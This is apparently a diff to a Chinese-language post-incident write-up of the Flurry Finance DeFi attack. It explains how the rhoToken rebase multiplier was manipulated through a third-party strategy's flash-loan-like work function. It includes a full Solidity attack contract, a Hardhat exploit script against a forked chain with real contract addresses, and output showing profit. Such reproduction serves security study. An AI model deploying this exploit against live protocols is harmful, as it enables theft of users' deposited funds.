@@ -12,9 +12,100 @@
 
 那么为什么要利用漏洞来调用更新币价函数，我直接在闪电贷调用不就得了？
 
-是不是有什么函数调用角色限制条件之类的？不过看了更新币价函数确实所有外部地址都可以调用，没有限制。
+## Flurry Finance 简介
 
-那么这就很神奇了，为啥攻击者非要以这种方式调用币价更新函数？
+Flurry Finance是一个投资聚合协议，用户可以向协议中存储稳定币（如BUSD、USDT等）换取等量的rhotoken，通过协议内置的投资策略获取收益，用户可以随时取出或者存储对应的稳定币及其收益。
+
+当用户将资产投入协议中，那么用户就可以使用协议内的投资策略来获取收益。
+
+FlurryFinance只采用了部分最具有投资价值defi项目作为投资目标，具体项目以及对应的策略参考：https://docs.flurry.finance/flurry-finance/the-rhotoken/supporting-strategies
+
+在默认情况下，用户存储稳定币换取的rhotoken数量和价格上的关系为1:1。
+
+当用户选择开启rebase选项后，用户的rhotoken在产生收益的过程中会增加，并且保持rhotoken和稳定币的1:1兑换关系。
+
+实现rhotoken价格恒定的底层逻辑是将用户的存款表示为实际存款与Multiplier的乘积。也就是说，rho代币的价格与multipier成直接正相关关系。
+
+```solidity
+    function balanceOf(address account) public view override(ERC20Upgradeable, IERC20Upgradeable) returns (uint256) {
+        if (isRebasingAccount(account)) {
+            return _timesMultiplier(_balances[account]);
+        }
+        return _balances[account];
+    }
+    function _timesMultiplier(uint256 input) internal view returns (uint256) {
+        return (input * multiplier) / ONE;
+    }
+    function isRebasingAccount(address account) public view override returns (bool) {
+        return
+            (_rebaseOptions[account] == RebaseOption.REBASING) ||
+            (_rebaseOptions[account] == RebaseOption.UNKNOWN && !account.isContract());
+    }
+```
+
+这一关键的multiplier计算是根据投资策略组合中所有策略的标的资产存量来进行计算的。存量越多，对应的Multiplier越大；存量越少，则对应的Multiplier越小。具体来说，M = ( TVL - nonrebasingRHO) / rebasingRHO。
+
+```solidity
+    function rebase() external override onlyRole(REBASE_ROLE) whenNotPaused nonReentrant {
+        IVaultConfig.Strategy[] memory strategies = config.getStrategiesList();
+
+        uint256 originalTvlInRho = rhoToken().totalSupply();
+        if (originalTvlInRho == 0) {
+            return;
+        }
+        // rebalance fund
+        _rebalance();
+        uint256 underlyingInvested;
+        for (uint256 i = 0; i < strategies.length; i++) {
+            underlyingInvested += strategies[i].target.updateBalanceOfUnderlying();
+        }
+        uint256 currentTvlInUnderlying = reserve() + underlyingInvested;
+        uint256 currentTvlInRho = (currentTvlInUnderlying * rhoOne()) / underlyingOne();
+        uint256 rhoRebasing = rhoToken().unadjustedRebasingSupply();
+        uint256 rhoNonRebasing = rhoToken().nonRebasingSupply();
+
+        if (rhoRebasing < 1e18) {
+            // in this case, rhoNonRebasing = rho TotalSupply
+            uint256 originalTvlInUnderlying = (originalTvlInRho * underlyingOne()) / rhoOne();
+            if (currentTvlInUnderlying > originalTvlInUnderlying) {
+                // invested accrued interest
+                // all the interest goes to the fee pool since no one is entitled for the interest.
+                uint256 feeToMint = ((currentTvlInUnderlying - originalTvlInUnderlying) * rhoOne()) / underlyingOne();
+                rhoToken().mint(address(this), feeToMint);
+                feeInRho += feeToMint;
+            }
+            return;
+        }
+
+        // from this point forward, rhoRebasing > 0
+        if (currentTvlInRho == originalTvlInRho) {
+            // no fees charged, multiplier does not change
+            return;
+        }
+        if (currentTvlInRho < originalTvlInRho) {//final branch in this attack
+            // this happens when fund is initially deployed to compound and get balance of underlying right away
+            // strategy losing money, no fees will be charged
+            uint256 _newM = ((currentTvlInRho - rhoNonRebasing) * 1e36) / rhoRebasing;
+            rhoToken().setMultiplier(_newM);
+            return;
+        }
+        uint256 fee36 = (currentTvlInRho - originalTvlInRho) * config.managementFee();
+        uint256 fee18 = fee36 / 1e18;
+        if (fee18 > 0) {
+            // mint vault's fee18
+            rhoToken().mint(address(this), fee18);
+            feeInRho += fee18;
+        }
+        uint256 newM = ((currentTvlInRho * 1e18 - rhoNonRebasing * 1e18 - fee36) * 1e18) / rhoRebasing;
+        rhoToken().setMultiplier(newM);
+    }
+```
+
+用户与FlurryFinance的交互接口为对应的Vault合约，用户的资金也是流向Vault中，并由Vault生成Rho代币。
+
+而rebasing RHOtoken的定价则是由对应的投资策略中的余额进行计算。
+
+也就是说，价格计算和用户存储资产的地址不一样。
 
 ## 攻击流程分析
 
@@ -50,17 +141,20 @@
 4. 用户（攻击合约）的rhotoken和busd approve给vault。
 5. 将用户（攻击合约）的BUSD approve给 pancake router。
 6. 向攻击者之前创建的魔改ERC20代币（攻击合约）和busd对输入流动性
-7. 向vault合约传入busd，mint出rho代币
-8. 调用performUpKeep，更新币价
-9. 调用redeem销毁rho，然后取出busd。
+7. 将前一步产生的流动性转款到要攻击的strategy地址，用于绕过后续函数的判定条件使用。
+8. 向vault合约传入busd，mint出rho代币
+9. 调用performUpKeep，更新币价
+10. 调用redeem销毁rho，然后取出busd。
 
-确实都是初始化工作，至于后面的7-9，目前还不理解为啥这么干。
+那么从以上的准备工作可以看出，用户前期只需要创建恶意的交换对以及恶意token，然后向这一交换对中注入一定的资金。在这里注入多少资金没有限制，只需要满足strategy地址有lp存量即可。
+
+至于后面的8-10步，只是为了 测试对应vault的功能，在后续攻击过程中没有意义，所以可以省略。
 
 ### work
 
 交易hash：0xa4da20133835e1a39f63e9eb35a1ba2a318a96a26681f700778602b284e91f2a
 
-这个work函数是直接调用的vault的合约，也就是实行攻击的这一步。
+这个work函数是直接调用的bank合约，也就是实行攻击的这一步。
 
 直接调用的work函数长这个样子，一些地方个人写了注释：
 
@@ -131,7 +225,7 @@
     }
 ```
 
-其函数的主要逻辑就是类似于闪电贷，但是借款和还款的流程。但是与正常的闪电贷流程不同，在这里是调用` Goblin(production.goblin).work{value:sendBNB}(posId, msg.sender, production.borrowToken, borrow, debt, data);`的方式来进行借款后的逻辑。
+其函数的主要逻辑就是类似于闪电贷，但是借款和还款的流程，在这里是调用` Goblin(production.goblin).work{value:sendBNB}(posId, msg.sender, production.borrowToken, borrow, debt, data);`的方式来进行借款后的逻辑。
 
 而goblin的work函数逻辑如下：
 
@@ -175,7 +269,7 @@
     }
 ```
 
-可以看到goblin只是将闪电贷操作转发给了Strategy来执行。
+可以看到goblin只是将闪电贷操作转发给了对应的Strategy来执行。
 
 而stategy的execute的逻辑如下：
 
@@ -217,11 +311,9 @@
     }
 ```
 
-分析execute函数逻辑，其实就是把strategy中的LP换成borrow token，一个比较直白的转换过程。
+分析execute函数逻辑，其实际作用就是将用户指定的swapPair全部换为借款代币，用户的借款数额在execute函数中并没有实际作用。
 
 那么这一套流程下来，实际并没有任何资产转到用户名下，整个的资金流是：vault->goblin->strategy，用户没有直接接手整个流程。
-
-不过不是闪电贷吗？用户不是传入了calldata吗？
 
 在本例中，用户传入的calldata只是用于指定进行最后swap的pair地址，calldata并没有使用在其他的外部调用中。
 
@@ -235,89 +327,15 @@
         }
         performData;
     }
-    // vault's rebase
-    function rebase() external override onlyRole(REBASE_ROLE) whenNotPaused nonReentrant {
-        IVaultConfig.Strategy[] memory strategies = config.getStrategiesList();
-
-        uint256 originalTvlInRho = rhoToken().totalSupply();
-        if (originalTvlInRho == 0) {
-            return;
-        }
-        // rebalance fund
-        _rebalance();
-        uint256 underlyingInvested;
-        for (uint256 i = 0; i < strategies.length; i++) {
-            underlyingInvested += strategies[i].target.updateBalanceOfUnderlying();
-        }
-        uint256 currentTvlInUnderlying = reserve() + underlyingInvested;
-        uint256 currentTvlInRho = (currentTvlInUnderlying * rhoOne()) / underlyingOne();
-        uint256 rhoRebasing = rhoToken().unadjustedRebasingSupply();
-        uint256 rhoNonRebasing = rhoToken().nonRebasingSupply();
-
-        if (rhoRebasing < 1e18) {
-            // in this case, rhoNonRebasing = rho TotalSupply
-            uint256 originalTvlInUnderlying = (originalTvlInRho * underlyingOne()) / rhoOne();
-            if (currentTvlInUnderlying > originalTvlInUnderlying) {
-                // invested accrued interest
-                // all the interest goes to the fee pool since no one is entitled for the interest.
-                uint256 feeToMint = ((currentTvlInUnderlying - originalTvlInUnderlying) * rhoOne()) / underlyingOne();
-                rhoToken().mint(address(this), feeToMint);
-                feeInRho += feeToMint;
-            }
-            return;
-        }
-
-        // from this point forward, rhoRebasing > 0
-        if (currentTvlInRho == originalTvlInRho) {
-            // no fees charged, multiplier does not change
-            return;
-        }
-        if (currentTvlInRho < originalTvlInRho) {//final branch in this attack
-            // this happens when fund is initially deployed to compound and get balance of underlying right away
-            // strategy losing money, no fees will be charged
-            uint256 _newM = ((currentTvlInRho - rhoNonRebasing) * 1e36) / rhoRebasing;
-            rhoToken().setMultiplier(_newM);
-            return;
-        }
-        uint256 fee36 = (currentTvlInRho - originalTvlInRho) * config.managementFee();
-        uint256 fee18 = fee36 / 1e18;
-        if (fee18 > 0) {
-            // mint vault's fee18
-            rhoToken().mint(address(this), fee18);
-            feeInRho += fee18;
-        }
-        uint256 newM = ((currentTvlInRho * 1e18 - rhoNonRebasing * 1e18 - fee36) * 1e18) / rhoRebasing;
-        rhoToken().setMultiplier(newM);
-    }
-
 ```
 
-rhotoken的币价计算是根据乘子multiplier，在rebase逻辑中可以看到，当rho中的tvl减少时，会导致newM的结果变小。
+rhotoken的币价计算是根据乘子multiplier，在之前rebase逻辑中可以看到，当rho中的tvl减少时，会导致newM的结果变小。
 
-由于最终的价格是根据vault中的余额进行计算，而这一步之前用户执行了work逻辑，钱变少了，所以自然最终的计算价格会变低。
+由于最终的价格是根据策略组合的余额进行计算，而这一步之前用户执行了work函数执行闪电贷逻辑，钱变少了，所以自然最终的计算价格会变低。
 
-```solidity
-    function balanceOf(address account) public view override(ERC20Upgradeable, IERC20Upgradeable) returns (uint256) {
-        if (isRebasingAccount(account)) {
-            return _timesMultiplier(_balances[account]);
-        }
-        return _balances[account];
-    }
-    function _timesMultiplier(uint256 input) internal view returns (uint256) {
-        return (input * multiplier) / ONE;
-    }
-    function isRebasingAccount(address account) public view override returns (bool) {
-        return
-            (_rebaseOptions[account] == RebaseOption.REBASING) ||
-            (_rebaseOptions[account] == RebaseOption.UNKNOWN && !account.isContract());
-    }
-```
+所以说，之前的问题就迎刃而解了，本次攻击中的闪电贷规定好了具体的工作步骤，用户不能直接运行其自定义逻辑。
 
-
-
-所以说，之前的问题就迎刃而解了：这个闪电贷根本就不是正常的闪电贷逻辑，而是一个披着闪电贷外衣的套利函数！
-
-也就是说，在正常调用work的逻辑下，用户不可能调用到perFormUpkeep，因为逻辑都写死了，但是利用那个漏洞就可以进行更新币价操作。
+也就是说，在正常调用work的逻辑下，用户不可能调用到perFormUpkeep，因为逻辑都写死了，但是利用漏洞就可以进行更新币价操作。
 
 ### 套利
 
@@ -327,99 +345,29 @@ rhotoken的币价计算是根据乘子multiplier，在rebase逻辑中可以看�
 
 ## 攻击复现
 
+此次攻击事件中攻击者攻击了多个 vault交易池，手法基本一致，这里只取了其中一例作为演示。
+
 攻击合约：
 
 ```solidity
 pragma solidity ^ 0.8.0;
 interface IVault {
-
-    function feeInRho() external view returns (uint256);
-
-    function reserve() external view returns (uint256);
-
-    function supportsAsset(address _asset) external view returns (bool);
-
-    function rebase() external;
-
-    function rebalance() external;
-
     function mint(uint256 amount) external;
-
     function redeem(uint256 amount) external;
-
-    function sweepERC20Token(address token, address to) external;
-
-    function sweepRhoTokenContractERC20Token(address token, address to) external;
-
-    function checkStrategiesCollectReward() external view returns (bool[] memory);
-
-    function supplyRate() external view returns (uint256);
-
-    function collectStrategiesRewardTokenByIndex(uint16[] memory collectList) external returns (bool[] memory);
-
-    function withdrawFees(uint256 amount, address to) external;
-
-    function shouldRepurchaseFlurry() external view returns (bool);
-
-    function repurchaseFlurry() external;
-
-
-
-    function getStrategiesListLength() external view returns (uint256);
-
-    function retireStrategy(address strategy) external;
-
-    function indicativeSupplyRate() external view returns (uint256);
-
-    function mintWithDepositToken(uint256 amount, address depositToken) external;
-
-    function getDepositTokens() external view returns (address[] memory);
-
-    function retireDepositUnwinder(address token) external;
 }
 interface IRhoToken  {
-
-    function getOwner() external view returns (address);
-
-    function adjustedRebasingSupply() external view returns (uint256);
-
-    function unadjustedRebasingSupply() external view returns (uint256);
-
-    function nonRebasingSupply() external view returns (uint256);
-
-    function setMultiplier(uint256 multiplier) external;
-
     function getMultiplier() external view returns (uint256 multiplier, uint256 lastUpdate);
-
     function mint(address account, uint256 amount) external;
-
     function burn(address account, uint256 amount) external;
-
     function setRebasingOption(bool isRebasing) external;
-
-    function isRebasingAccount(address account) external view returns (bool);
-
-    function setTokenRewards(address tokenRewards) external;
-
-    function sweepERC20Token(address token, address to) external;
 }
 interface IERC20{
-
     function totalSupply() external view returns (uint256);
-
     function balanceOf(address account) external view returns (uint256);
-
     function transfer(address recipient, uint256 amount) external returns (bool);
-
     function allowance(address owner, address spender) external view returns (uint256);
-
     function approve(address spender, uint256 amount) external returns (bool);
-
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint256 amount
-    ) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 
 }
 interface IBANK{
@@ -429,9 +377,6 @@ interface IPerform{
     function performUpkeep(bytes calldata performData) external;
 }
 interface IPancakeRouter01 {
-    function factory() external pure returns (address);
-    function WETH() external pure returns (address);
-
     function addLiquidity(
         address tokenA,
         address tokenB,
@@ -442,14 +387,7 @@ interface IPancakeRouter01 {
         address to,
         uint deadline
     ) external returns (uint amountA, uint amountB, uint liquidity);
-    function addLiquidityETH(
-        address token,
-        uint amountTokenDesired,
-        uint amountTokenMin,
-        uint amountETHMin,
-        address to,
-        uint deadline
-    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+
     function removeLiquidity(
         address tokenA,
         address tokenB,
@@ -459,33 +397,6 @@ interface IPancakeRouter01 {
         address to,
         uint deadline
     ) external returns (uint amountA, uint amountB);
-    function removeLiquidityETH(
-        address token,
-        uint liquidity,
-        uint amountTokenMin,
-        uint amountETHMin,
-        address to,
-        uint deadline
-    ) external returns (uint amountToken, uint amountETH);
-    function removeLiquidityWithPermit(
-        address tokenA,
-        address tokenB,
-        uint liquidity,
-        uint amountAMin,
-        uint amountBMin,
-        address to,
-        uint deadline,
-        bool approveMax, uint8 v, bytes32 r, bytes32 s
-    ) external returns (uint amountA, uint amountB);
-    function removeLiquidityETHWithPermit(
-        address token,
-        uint liquidity,
-        uint amountTokenMin,
-        uint amountETHMin,
-        address to,
-        uint deadline,
-        bool approveMax, uint8 v, bytes32 r, bytes32 s
-    ) external returns (uint amountToken, uint amountETH);
     function swapExactTokensForTokens(
         uint amountIn,
         uint amountOutMin,
@@ -500,121 +411,16 @@ interface IPancakeRouter01 {
         address to,
         uint deadline
     ) external returns (uint[] memory amounts);
-    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
-        external
-        payable
-        returns (uint[] memory amounts);
-    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
-        external
-        returns (uint[] memory amounts);
-    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
-        external
-        returns (uint[] memory amounts);
-    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
-        external
-        payable
-        returns (uint[] memory amounts);
-
-    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
-    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
-    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
-    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
-    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
 }
 interface IPancakeFactory {
-    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
-
-    function feeTo() external view returns (address);
-    function feeToSetter() external view returns (address);
-
     function getPair(address tokenA, address tokenB) external view returns (address pair);
-    function allPairs(uint) external view returns (address pair);
-    function allPairsLength() external view returns (uint);
-
-    function createPair(address tokenA, address tokenB) external returns (address pair);
-
-    function setFeeTo(address) external;
-    function setFeeToSetter(address) external;
 }
 interface IPancakePair {
-
-    function name() external pure returns (string memory);
-    function symbol() external pure returns (string memory);
-    function decimals() external pure returns (uint8);
-    function totalSupply() external view returns (uint);
     function balanceOf(address owner) external view returns (uint);
-    function allowance(address owner, address spender) external view returns (uint);
-
-    function approve(address spender, uint value) external returns (bool);
     function transfer(address to, uint value) external returns (bool);
     function transferFrom(address from, address to, uint value) external returns (bool);
-
-    function DOMAIN_SEPARATOR() external view returns (bytes32);
-    function PERMIT_TYPEHASH() external pure returns (bytes32);
-    function nonces(address owner) external view returns (uint);
-
-    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
-
-    function MINIMUM_LIQUIDITY() external pure returns (uint);
-    function factory() external view returns (address);
-    function token0() external view returns (address);
-    function token1() external view returns (address);
-    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
-    function price0CumulativeLast() external view returns (uint);
-    function price1CumulativeLast() external view returns (uint);
-    function kLast() external view returns (uint);
-
     function mint(address to) external returns (uint liquidity);
     function burn(address to) external returns (uint amount0, uint amount1);
-    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
-    function skim(address to) external;
-    function sync() external;
-
-    function initialize(address, address) external;
-}
-interface IDODOCallee {
-    function DVMSellShareCall(
-        address sender,
-        uint256 burnShareAmount,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external;
-
-    function DVMFlashLoanCall(
-        address sender,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external;
-
-    function DPPFlashLoanCall(
-        address sender,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external;
-
-    function CPCancelCall(
-        address sender,
-        uint256 amount,
-        bytes calldata data
-    ) external;
-
-	function CPClaimBidCall(
-        address sender,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external;
-}
-interface IDPP{
-        function flashLoan(
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        address assetTo,
-        bytes calldata data
-    ) external;
 }
 contract attack_erc20{
     address public owner;
@@ -632,8 +438,10 @@ contract attack_erc20{
 
 
 
-    uint public  BUSDBalanceBefore;
+    uint public BUSDBalanceBefore;
     uint public BUSDBalanceAfter;
+    uint public rhoBefore;
+    uint public rhoAfter;
     uint public Mbefore;
     uint public Mafter;
     uint public MAX = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
@@ -699,20 +507,16 @@ contract attack_erc20{
         IERC20(rhoAddress).approve(PancakeRouter, MAX);
         IERC20(BUSDAddress).approve(PancakeRouter, MAX);
 
-        IVault(vaultAddress).mint(3000000);
+        IVault(vaultAddress).mint(IERC20(BUSDAddress).balanceOf(vaultAddress)*10);
+        rhoBefore = IERC20(rhoAddress).balanceOf(address(this));
         IPerform(rebaseUpKeep).performUpkeep("0x");
-
-        address[] memory path = new address[](2);
-        path[0] = rhoAddress;
-        path[1] = BUSDAddress;
-        IPancakeRouter01(PancakeRouter).swapExactTokensForTokens(3000000, 0, path, address(this), block.timestamp);
+        (Mafter,) = IRhoToken(rhoAddress).getMultiplier();
+        rhoAfter = IERC20(rhoAddress).balanceOf(address(this));
+        IVault(vaultAddress).redeem(rhoAfter);
 
         BUSDBalanceAfter = IERC20(BUSDAddress).balanceOf(address(this));
-        (Mafter,) = IRhoToken(rhoAddress).getMultiplier();
+        
     }
-
-
-
 }
 ```
 
@@ -720,9 +524,6 @@ exp：
 
 ```js
 const hre = require("hardhat");
-
-
-
 async function main() {
 
     const BUSD = "0x55d398326f99059fF775485246999027B3197955";
@@ -742,6 +543,7 @@ async function main() {
     });
     const signer = await hre.ethers.getSigner(BUSD_HOLDER)
     const IERC20 = await hre.ethers.getContractAt("contracts/attack.sol:IERC20", BUSD, signer);
+    //const IRHO = await hre.ethers.getContractAt("contracts/attack.sol:IRhoToken", BUSD, signer);
     let amount = await IERC20.balanceOf(BUSD_HOLDER);
     let tx = await IERC20.transfer(hack.address, amount);
     console.log('Transfer %s BUSD from %s to %s', amount, BUSD_HOLDER, hack.address);
@@ -751,7 +553,7 @@ async function main() {
     const IBANK = await hre.ethers.getContractAt("contracts/attack.sol:IBANK", BANK_ADDR, signer);
 
     let data = hre.ethers.utils.defaultAbiCoder.encode(['address', 'uint', 'uint', 'address' ,'uint'], [STRATEGY, 0x40, 0x40 ,pairAddr, 2]);
-    console.log("data: ", data);
+    //console.log("data: ", data);
 
     let borrowAmount = await IERC20.balanceOf(BANK_ADDR);
     await IBANK.work(0, 15, borrowAmount, data);
@@ -761,10 +563,14 @@ async function main() {
     let after = await hack.BUSDBalanceAfter();
     let Mbefore = await hack.Mbefore();
     let Mafter = await hack.Mafter();
+    let rhoBefore = await hack.rhoBefore();
+    let rhoAfter = await hack.rhoAfter()
     console.log("attacker BUSD before: ", before);
     console.log("attacker BUSD after:  ", after);
     console.log("attacker Mbefore: ", Mbefore);
     console.log("attacker Mafter:  ", Mafter);
+    console.log("attacker rho before: ", rhoBefore);
+    console.log("attacker rho after:  ", rhoAfter);
 
 }
 
@@ -772,44 +578,27 @@ main().catch((error) => {
     console.error(error);
     process.exitCode = 1;
 });
-/*
-0000000000000000000000005085c49828b0b8e69bae99d96a8e0fcf0a033369
-0000000000000000000000000000000000000000000000000000000000000040
-0000000000000000000000000000000000000000000000000000000000000040
-000000000000000000000000c6015317c28cdd60c208fbc58977e77eed534b3a
-0000000000000000000000000000000000000000000000000000000000000002
-
-0000000000000000000000005085c49828b0b8e69bae99d96a8e0fcf0a033369
-0000000000000000000000000000000000000000000000000000000000000040
-0000000000000000000000000000000000000000000000000000000000000040
-0000000000000000000000000000000000000000000000000000000000000000
-0000000000000000000000000000000000000000000000000000000000000002
-*/
 ```
 
 攻击结果：
 
 ```
-Compiled 1 Solidity file successfully
 attack contract deployed to: 0x4BCD98b42fd74c8f386E650848773e841A5d332B
 Transfer 203073438574967167623188420 BUSD from 0xEFDca55e4bCE6c1d535cb2D0687B5567eEF2AE83 to 0x4BCD98b42fd74c8f386E650848773e841A5d332B
-data:  0x0000000000000000000000005085c49828b0b8e69bae99d96a8e0fcf0a03336900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000040000000000000000000000000781dd247c999e9f207ccb0577f9fc3ad90acf96a0000000000000000000000000000000000000000000000000000000000000002
 step 2
 attacker BUSD before:  BigNumber { value: "203073438574967167623187419" }
-attacker BUSD after:   BigNumber { value: "203073438574967167623125153" }
-attacker Mbefore:  BigNumber { value: "751295189222171932353302563829167368" }
-attacker Mafter:   BigNumber { value: "1020891776607689313699506183756594066" }
+attacker BUSD after:   BigNumber { value: "203090587098027369704261350" }
+attacker Mbefore:  BigNumber { value: "751295171398263007193096695790421526" }
+attacker Mafter:   BigNumber { value: "904605593422534980373597747412875634" }
+attacker rho before:  BigNumber { value: "84036051832809300867950" }
+attacker rho after:   BigNumber { value: "101184574893011381941881" }
 ```
 
-效果不是很好，最后的套利由于攻击者在多个交易池进行交换，没有全部在BUSD套利所以基本没变化。
-
-最终的M则变化很明显，基本是正常值的0.7倍。
+由于之前的攻击，导致 rhotoken 的 multiplier低于正常值，用户可以用稳定币以低价换取rhotoken。调用完performUpkeep后multiplier回归正常值，用户之前换取的rhotoken的数量就会增加（大概是之前的1.2倍），此时用户将rho换回稳定币即可获利。
 
 ## 总结
 
-只能说我见识不多，这个闪电贷的形式和我理解的常规的闪电贷不一样，不过严格意义上来说确实是闪电贷攻击：一笔交易完成借款还款并且攻击币价。
-
-只能说看不懂certik的报告是我个人水平原因。
+本次攻击FlurryFinance的实现本身没有问题，漏洞点出现在第三方的Strategy合约，但是FlurryFInance本身的设计中标的资产存储地址和用于计算币价的存储地址不同，间接的导致了攻击的发生。
 
 
 
